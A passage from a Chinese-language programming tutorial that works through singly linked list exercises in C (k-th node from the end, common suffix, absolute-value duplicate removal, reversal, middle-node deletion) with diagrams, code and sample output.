	Node* head = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));
	head-&gt;data = <span class="hljs-number">0</span>;
	head-&gt;link = <span class="hljs-literal">NULL</span>;
	<span class="hljs-keyword">return</span> head;
}



<span class="hljs-type">int</span> <span class="hljs-title function_">findNodeFS</span><span class="hljs-params">(Node*L,<span class="hljs-type">int</span> k)</span> {

	Node* fast = L-&gt;link;
	Node* slow = L-&gt;link;

	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; k; i++)
	{
		fast = fast-&gt;link;
	}
	<span class="hljs-keyword">while</span> (fast != <span class="hljs-literal">NULL</span>)
	{
		fast = fast-&gt;link;
		slow = slow-&gt;link;
	}
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"倒数第%d个节点值为%d\n"</span>, k, slow-&gt;data);
	<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
}

<span class="hljs-comment">//尾插法</span>
Node* <span class="hljs-title function_">get_tail</span><span class="hljs-params">(Node* L)</span> {
	Node* p = L;
	<span class="hljs-keyword">while</span> (p-&gt;link != <span class="hljs-literal">NULL</span>) {
		p = p-&gt;link;
	}
	<span class="hljs-keyword">return</span> p;
}

<span class="hljs-type">int</span> <span class="hljs-title function_">insertTail</span><span class="hljs-params">(Node* L, ElemType e)</span> {
	Node* tail=get_tail(L);
	Node* p = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));

	<span class="hljs-comment">//赋值并连接节点</span>
	p-&gt;data = e;
	tail-&gt;link = p;
	p-&gt;link = <span class="hljs-literal">NULL</span>;
	
	<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
}

<span class="hljs-comment">//遍历</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">PrintNode</span><span class="hljs-params">(Node*L)</span>
{
	Node* p = L-&gt;link;
		<span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) {
			<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>, p-&gt;data);
			p = p-&gt;link;
		}
		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);
}
<span class="hljs-comment">//释放链表</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">freeList</span><span class="hljs-params">(Node* L)</span> {
	Node* p = L-&gt;link;
	Node* q;

	<span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) {
		q = p-&gt;link;
		<span class="hljs-built_in">free</span>(p);
		p = q;
	}
	L-&gt;link = <span class="hljs-literal">NULL</span>;
}

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
	Node* <span class="hljs-built_in">list</span> = initList();

	insertTail(<span class="hljs-built_in">list</span>, <span class="hljs-number">10</span>);
	insertTail(<span class="hljs-built_in">list</span>, <span class="hljs-number">20</span>);
	insertTail(<span class="hljs-built_in">list</span>, <span class="hljs-number">30</span>);
	insertTail(<span class="hljs-built_in">list</span>, <span class="hljs-number">40</span>);
	insertTail(<span class="hljs-built_in">list</span>, <span class="hljs-number">50</span>);
	insertTail(<span class="hljs-built_in">list</span>, <span class="hljs-number">60</span>);
	insertTail(<span class="hljs-built_in">list</span>, <span class="hljs-number">70</span>);
	PrintNode(<span class="hljs-built_in">list</span>);

	findNodeFS(<span class="hljs-built_in">list</span>, <span class="hljs-number">3</span>);

	freeList(<span class="hljs-built_in">list</span>);

	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>运行结果：</p>
<blockquote>
<p>10 20 30 40 50 60 70</p>
<p>倒数第3个节点值为50</p>
</blockquote>
<h3 data-id="heading-2">练习2---两链表公共后缀</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2cfed2b68160493daf9c1e13e5751b2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgNzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765619492&amp;x-signature=p0W%2FxHZGFmQL%2B6t7Ezy9bkQuK4U%3D" alt="image-20251206104336184.png" loading="lazy"/></p>
<p>(1)算法基本设计思路</p>
<p>第一步：分别求出两个链表的长度m和n</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c7f13a3dcf9457f9526f945428baaaa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgNzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765619492&amp;x-signature=NmDhAtYNknY86nVhDyvJcTJ5RVE%3D" alt="image-20251206105615512.png" loading="lazy"/></p>
<p>第二步：Fast指针指向较长的链表，先走m-n或n-m步。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b44bf7cbb4f144a08128dbc8a677bd7b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgNzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765619492&amp;x-signature=6dqJZm3MGHTk67o6MC3wXV%2BnKIg%3D" alt="image-20251206105847744.png" loading="lazy"/>
第三步：同步移动指针，判断是否指向同一个节点。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ea34c3394e54d75a27bb8de5a9227a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgNzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765619492&amp;x-signature=BNAQk82PfV7FI8U3bFFJ5RQi%2B%2BA%3D" alt="image-20251206110156863.png" loading="lazy"/></p>
<p>完整代码：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> ElemType;

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> {</span>
	ElemType data;
	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">next</span>;</span>
}Node;


<span class="hljs-comment">//初始化</span>
Node* <span class="hljs-title function_">initList</span><span class="hljs-params">()</span>
{
	Node* head = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));
	head-&gt;data = <span class="hljs-number">0</span>;
	head-&gt;next = <span class="hljs-literal">NULL</span>;
	<span class="hljs-keyword">return</span> head;
}
<span class="hljs-comment">//初始化节点（带节点数据参数）</span>
Node* <span class="hljs-title function_">initListWithElem</span><span class="hljs-params">(ElemType e)</span> {
	Node* node = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));
	node-&gt;data = e;
	node-&gt;next = <span class="hljs-literal">NULL</span>;
	<span class="hljs-keyword">return</span> node;
}

<span class="hljs-comment">//获取链表长度</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">getLength</span><span class="hljs-params">(Node* L)</span> {
	Node* p = L-&gt;next;
	<span class="hljs-type">int</span> len = <span class="hljs-number">0</span>;
	<span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) {
		p = p-&gt;next;
		len++;
	}
	<span class="hljs-keyword">return</span> len;
}

<span class="hljs-comment">//</span>
Node* <span class="hljs-title function_">findCommonSuff</span><span class="hljs-params">(Node* str1, Node* str2)</span>
{
	<span class="hljs-keyword">if</span> (str1 == <span class="hljs-literal">NULL</span> || str2 == <span class="hljs-literal">NULL</span>)
	{
		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
	}

	<span class="hljs-type">int</span> m = getLength(str1);
	<span class="hljs-type">int</span> n = getLength(str2);

	Node* longList = str1-&gt;next;
	Node* shortList = str2-&gt;next;

	<span class="hljs-keyword">if</span> (n &gt; m) {
		longList = str2-&gt;next;
		shortList = str1-&gt;next;
	}

	<span class="hljs-type">int</span> diff = <span class="hljs-built_in">abs</span>(m - n);<span class="hljs-comment">//m n的差值</span>
	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; diff; i++)
	{
		<span class="hljs-keyword">if</span> (longList == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">break</span>;
		longList = longList-&gt;next;
	}

	<span class="hljs-keyword">while</span> (longList!=<span class="hljs-literal">NULL</span>&amp;&amp;shortList!=<span class="hljs-literal">NULL</span>)
	{
		<span class="hljs-keyword">if</span> (longList == shortList)
		{
			<span class="hljs-keyword">return</span> longList;
		}
		longList = longList-&gt;next;
		shortList = shortList-&gt;next;
		
	}
	<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
}

<span class="hljs-comment">//尾插法</span>
Node* <span class="hljs-title function_">get_tail</span><span class="hljs-params">(Node* L)</span>
{
	Node* p = L;
	<span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span>)
	{
		p = p-&gt;next;
	}
	<span class="hljs-keyword">return</span> p;
}

Node* <span class="hljs-title function_">TailList</span><span class="hljs-params">(Node* L, ElemType e)</span>
{
	Node* tail = get_tail(L);
	Node* p = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));
	p-&gt;data = e;
	tail-&gt;next = p;
	p-&gt;next = <span class="hljs-literal">NULL</span>;
	<span class="hljs-keyword">return</span> p;
}

<span class="hljs-comment">//尾插法（节点）</span>
Node* <span class="hljs-title function_">insertTailWithNode</span><span class="hljs-params">(Node* L, Node* node)</span> {
	Node* tail = get_tail(L);
	tail-&gt;next = node;
	node-&gt;next = <span class="hljs-literal">NULL</span>;
	<span class="hljs-keyword">return</span> node;
}

<span class="hljs-comment">//遍历</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">PrintList</span><span class="hljs-params">(Node* L)</span>
{
	Node* p = L-&gt;next;
	<span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) {
		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c "</span>, p-&gt;data);
		p = p-&gt;next;
	}
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);
}

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
	Node* str1 = initList();
	Node* str2 = initList();

	TailList(str1, <span class="hljs-string">'l'</span>);
	TailList(str1, <span class="hljs-string">'o'</span>);
	TailList(str1, <span class="hljs-string">'a'</span>);
	TailList(str1, <span class="hljs-string">'d'</span>);


	TailList(str2, <span class="hljs-string">'b'</span>);
	TailList(str2, <span class="hljs-string">'e'</span>);

	<span class="hljs-comment">//创建带数据域的新节点</span>
	Node* node1 = initListWithElem(<span class="hljs-string">'i'</span>);
	Node* node2 = initListWithElem(<span class="hljs-string">'n'</span>);
	Node* node3 = initListWithElem(<span class="hljs-string">'g'</span>);

	<span class="hljs-comment">//让str1和str2都指向 i n g</span>
	insertTailWithNode(str1, node1);
	insertTailWithNode(str1, node2);
	insertTailWithNode(str1, node3);

	insertTailWithNode(str2, node1);
	insertTailWithNode(str2, node2);
	insertTailWithNode(str2, node3);
    
    <span class="hljs-comment">//遍历</span>
	PrintList(str1);
	PrintList(str2);
    
	Node*com=findCommonSuff(str1, str2);
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c "</span>, com-&gt;data);


}
</code></pre>
<p>运行结果：</p>
<blockquote>
<p>l o a d i n g</p>
<p>b e i n g</p>
<p>i</p>
</blockquote>
<p>(3)时间复杂度：O(m+n)</p>
<h3 data-id="heading-3">练习3---用辅助数组删除绝对值重复节点</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e2772f4b9ea42d99eadabe28ed89d8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgNzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765619492&amp;x-signature=%2FxVOg8DBgnzhlF92vqh9VezsNA0%3D" alt="image-20251206140609674.png" loading="lazy"/></p>
<p>(1)算法基本设计思想</p>
<p>利用<strong>空间换时间</strong>的策略，借助辅助数组记录链表中已出现的节点绝对值：</p>
<ul>
<li>
<p>由于<code>|data| ≤ n</code>，创建大小为<code>n+1</code>的辅助数组（下标对应节点绝对值），初始值为 0；</p>
</li>
<li>
<p>遍历链表，对每个节点取其<code>data</code>的绝对值，检查辅助数组对应下标的值：</p>
<ul>
<li>若为 0，说明该绝对值首次出现，保留节点并将数组对应值设为 1；</li>
<li>若为 1，说明该绝对值已出现过，删除当前节点。</li>
</ul>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1eaa96fcdde94bd48279df54a89a30d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgNzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765619492&amp;x-signature=SAp7g4nti49GMmx%2BVh%2BVm0vEH9I%3D" alt="image-20251206144552172.png" loading="lazy"/>
(2) 单链表结点的数据类型定义</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> {</span>
    <span class="hljs-type">int</span> data;          <span class="hljs-comment">// 数据域</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">link</span>;</span> <span class="hljs-comment">// 指针域，指向下一个结点</span>
} Node;
</code></pre>
<p>(3)关键算法：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">void</span> <span class="hljs-title function_">removeNode</span><span class="hljs-params">(Node* L, <span class="hljs-type">int</span> n)</span> 
{
	Node* p = L; <span class="hljs-comment">// p指向当前节点的前驱（从头结点开始，方便删除操作）</span>
	<span class="hljs-type">int</span> index;   <span class="hljs-comment">//作为数组下标</span>
	<span class="hljs-type">int</span>* q = (<span class="hljs-type">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>) * (n + <span class="hljs-number">1</span>));<span class="hljs-comment">//给数组分配空间</span>

	<span class="hljs-comment">//遍历数组，初始化值为0</span>
	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n + <span class="hljs-number">1</span>; i++)
	{
		*(q + i) = <span class="hljs-number">0</span>;
	}

	<span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span>)
	{
		index = <span class="hljs-built_in">abs</span>(p-&gt;next-&gt;data);<span class="hljs-comment">//获取绝对值</span>
		<span class="hljs-keyword">if</span> (*(q + index) == <span class="hljs-number">0</span>)
		{
			*(q + index) = <span class="hljs-number">1</span>;
			p = p-&gt;next;
		}
		<span class="hljs-keyword">else</span>  <span class="hljs-comment">// 重复出现，删除p的后继节点</span>
		{
			Node* temp = p-&gt;next;  <span class="hljs-comment">// 保存待删除节点</span>
			p-&gt;next = temp-&gt;next;  <span class="hljs-comment">// 跳过待删除节点</span>
			<span class="hljs-built_in">free</span>(temp);
			<span class="hljs-comment">//此处p不后移，因为新的p-&gt;next需要重新检查</span>
		}
	}
	<span class="hljs-built_in">free</span>(q);<span class="hljs-comment">//释放数组</span>
}

</code></pre>
<p>完整代码：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElemType;

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> {</span>
	ElemType data;
	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">next</span>;</span>
}Node;

<span class="hljs-comment">//初始化</span>
Node* <span class="hljs-title function_">initList</span><span class="hljs-params">()</span>
{
	Node* head = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));
	head-&gt;data = <span class="hljs-number">0</span>;
	head-&gt;next = <span class="hljs-literal">NULL</span>;
	<span class="hljs-keyword">return</span> head;
}

<span class="hljs-type">void</span> <span class="hljs-title function_">removeNode</span><span class="hljs-params">(Node* L, <span class="hljs-type">int</span> n)</span> 
{
	Node* p = L; <span class="hljs-comment">// p指向当前节点的前驱（从头结点开始，方便删除操作）</span>
	<span class="hljs-type">int</span> index;   <span class="hljs-comment">//作为数组下标</span>
	<span class="hljs-type">int</span>* q = (<span class="hljs-type">int</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>) * (n + <span class="hljs-number">1</span>));<span class="hljs-comment">//给数组分配空间</span>

	<span class="hljs-comment">//遍历数组，初始化值为0</span>
	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n + <span class="hljs-number">1</span>; i++)
	{
		*(q + i) = <span class="hljs-number">0</span>;
	}

	<span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span>)
	{
		index = <span class="hljs-built_in">abs</span>(p-&gt;next-&gt;data);<span class="hljs-comment">//获取绝对值</span>
		<span class="hljs-keyword">if</span> (*(q + index) == <span class="hljs-number">0</span>)
		{
			*(q + index) = <span class="hljs-number">1</span>;
			p = p-&gt;next;
		}
		<span class="hljs-keyword">else</span>  <span class="hljs-comment">// 重复出现，删除p的后继节点</span>
		{
			Node* temp = p-&gt;next;  <span class="hljs-comment">// 保存待删除节点</span>
			p-&gt;next = temp-&gt;next;  <span class="hljs-comment">// 跳过待删除节点</span>
			<span class="hljs-built_in">free</span>(temp);
			<span class="hljs-comment">//此处p不后移，因为新的p-&gt;next需要重新检查</span>
		}
	}
	<span class="hljs-built_in">free</span>(q);<span class="hljs-comment">//释放数组</span>
}

<span class="hljs-comment">//尾插法</span>
Node* <span class="hljs-title function_">get_tail</span><span class="hljs-params">(Node* L)</span>
{
	Node* p = L;
	<span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span>)
	{
		p = p-&gt;next;
	}
	<span class="hljs-keyword">return</span> p;
}

Node* <span class="hljs-title function_">TailList</span><span class="hljs-params">(Node* L, ElemType e)</span>
{
	Node* tail = get_tail(L);
	Node* p = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));
	p-&gt;data = e;
	tail-&gt;next = p;
	p-&gt;next = <span class="hljs-literal">NULL</span>;
	<span class="hljs-keyword">return</span> p;
}

<span class="hljs-comment">//遍历</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">PrintList</span><span class="hljs-params">(Node* L)</span>
{
	Node* p = L-&gt;next;
	<span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>)
	{		
		
		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>,p-&gt;data);
		p = p-&gt;next;
	}
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);
}

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
	Node* <span class="hljs-built_in">list</span> = initList();

	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">21</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">-15</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">-15</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">7</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">15</span>);
	PrintList(<span class="hljs-built_in">list</span>);

	removeNode(<span class="hljs-built_in">list</span>, <span class="hljs-number">21</span>);

	PrintList(<span class="hljs-built_in">list</span>);
}


</code></pre>
<p>运行结果：</p>
<blockquote>
<p>21 -15 -15 7 15</p>
<p>21 -15 7</p>
</blockquote>
<h2 data-id="heading-4">反转链表</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e60ceb24fce644b281927478016459be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgNzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765619492&amp;x-signature=HjFXgm45nKqIpNWFIHDkSMiR%2FtQ%3D" alt="image-20251206151629667.png" loading="lazy"/></p>
<p><strong>核心思路（迭代法，最优</strong></p>
<blockquote>
<p>通过 3 个指针（<code>first</code>/<code>second</code>/<code>third</code>）逐步反转节点指向：</p>
<ol>
<li>初始化<code>first=NULL</code>（反转后的尾节点）、<code>second=head-&gt;next</code>（当前待反转节点，跳过头结点）；</li>
<li>遍历链表，每次先保存<code>second</code>的后继节点（<code>third=second-&gt;next</code>）；</li>
<li>将<code>second</code>的<code>next</code>指向<code>first</code>（反转指向）；</li>
<li><code>first</code>和<code>second</code>分别后移（<code>first=second</code>，<code>second=third</code>）；</li>
<li>遍历结束后，将头结点<code>hd-&gt;next</code>指向<code>first</code>（新的链表头）。</li>
</ol>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa5289d149d84330ac8270598cc5907d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgNzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765619492&amp;x-signature=vZnNXHibb%2B6MtQ2g7KQbeftArJQ%3D" alt="image-20251206154300460.png" loading="lazy"/></p>
<p>最后一次情况如下图：</p>
<blockquote>
<p>头节点指向fiest
head-&gt;next = first;</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1937bf89743b4908905d120b6bc9adb1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgNzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765619492&amp;x-signature=dRQIoLVjphc2yc0Ez8xFr4nDauc%3D" alt="image-20251206155303785.png" loading="lazy"/></p>
<pre><code class="hljs language-c" lang="c">Node* <span class="hljs-title function_">reverseList</span><span class="hljs-params">(Node* head)</span>
{
	Node* first = <span class="hljs-literal">NULL</span>;
	Node* second = head-&gt;next;
	Node* third;

	<span class="hljs-keyword">while</span> (second != <span class="hljs-literal">NULL</span>) {
		third = second-&gt;next;
		second-&gt;next = first;
		first = second;
		second = third;
	}
	head-&gt;next = first;
}
</code></pre>
<p>完整代码：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElemType;

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> {</span>
	ElemType data;
	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">next</span>;</span>
}Node;

<span class="hljs-comment">//初始化</span>
Node* <span class="hljs-title function_">initList</span><span class="hljs-params">()</span>
{
	Node* head = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));
	head-&gt;data = <span class="hljs-number">0</span>;
	head-&gt;next = <span class="hljs-literal">NULL</span>;
	<span class="hljs-keyword">return</span> head;
}

<span class="hljs-comment">//尾插法</span>
Node* <span class="hljs-title function_">get_tail</span><span class="hljs-params">(Node* L)</span>
{
	Node* p = L;
	<span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span>)
	{
		p = p-&gt;next;
	}
	<span class="hljs-keyword">return</span> p;
}

Node* <span class="hljs-title function_">TailList</span><span class="hljs-params">(Node* L, ElemType e)</span>
{
	Node* tail = get_tail(L);
	Node* p = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));
	p-&gt;data = e;
	tail-&gt;next = p;
	p-&gt;next = <span class="hljs-literal">NULL</span>;
	<span class="hljs-keyword">return</span> p;
}

<span class="hljs-comment">//反转链表</span>
Node* <span class="hljs-title function_">reverseList</span><span class="hljs-params">(Node* head)</span>
{
	Node* first = <span class="hljs-literal">NULL</span>;
	Node* second = head-&gt;next;
	Node* third;

	<span class="hljs-keyword">while</span> (second != <span class="hljs-literal">NULL</span>) {
		third = second-&gt;next;
		second-&gt;next = first;
		first = second;
		second = third;
	}
	head-&gt;next = first;
	<span class="hljs-keyword">return</span> head;
}


<span class="hljs-comment">//遍历</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">PrintList</span><span class="hljs-params">(Node* L)</span>
{
	Node* p = L-&gt;next;
	<span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>)
	{		
		
		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>,p-&gt;data);
		p = p-&gt;next;
	}
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);
}

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
	Node* <span class="hljs-built_in">list</span> = initList();

	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">1</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">2</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">3</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">4</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">5</span>);
    TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">6</span>);
	PrintList(<span class="hljs-built_in">list</span>);

	Node* reserve=reverseList(<span class="hljs-built_in">list</span>);
	PrintList(reserve);
}
</code></pre>
<p>运行结果：</p>
<blockquote>
<p>1 2 3 4 5 6</p>
<p>6 5 4 3 2 1</p>
</blockquote>
<h2 data-id="heading-5">删除链表的中间节点</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae477e45bb634ba0b13644efbb4ea946~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgNzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765619492&amp;x-signature=tlUFhYr0l76PODb8HMWiOqa3Tp0%3D" alt="image-20251206155722406.png" loading="lazy"/></p>
<p>用快慢指针：</p>
<ul>
<li><strong>慢指针（slow）</strong>：每次走 1 步，最终指向<strong>中间节点的前驱</strong>（方便删除）。</li>
<li><strong>快指针（fast）</strong>：每次走 2 步，用于控制慢指针的停止位置。</li>
</ul>
<p>假设链表有效节点数为 <code>n</code>：</p>
<ul>
<li>若 <code>n</code> 为奇数（如 n=5）：中间节点是第 <code>(n+1)/2</code> 个（第 3 个），快指针走到尾节点时，慢指针到中间节点前驱；</li>
<li>若 <code>n</code> 为偶数（如 n=4）：中间节点通常取第 <code>n/2</code> 个（第 2 个），快指针走到 NULL 时，慢指针到中间节点前驱。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13fcbfe39bb64865a07bbecab4e2ca13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgNzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765619492&amp;x-signature=QTd%2FU0cHdTADgZRqFwJw7MfeDSY%3D" alt="image-20251206160611265.png" loading="lazy"/></p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">//删除中间节点</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">delMiddleNode</span><span class="hljs-params">(Node* head)</span>
{
	Node* fast = head-&gt;next;
	Node* slow = head;

	<span class="hljs-keyword">while</span> (fast != <span class="hljs-literal">NULL</span> &amp;&amp; fast-&gt;next!=<span class="hljs-literal">NULL</span>)
	{
		fast = fast-&gt;next-&gt;next;<span class="hljs-comment">//fast移动两步</span>
		slow = slow-&gt;next;<span class="hljs-comment">//slow移动一步</span>
	}
	Node* q = slow-&gt;next;<span class="hljs-comment">//q记录被删除的节点</span>
	slow-&gt;next = q-&gt;next;<span class="hljs-comment">//slow指向被删除的下一个节点</span>
	<span class="hljs-built_in">free</span>(q);
	<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
}
</code></pre>
<p>完整代码：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElemType;

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> {</span>
	ElemType data;
	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">next</span>;</span>
}Node;

<span class="hljs-comment">//初始化</span>
Node* <span class="hljs-title function_">initList</span><span class="hljs-params">()</span>
{
	Node* head = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));
	head-&gt;data = <span class="hljs-number">0</span>;
	head-&gt;next = <span class="hljs-literal">NULL</span>;
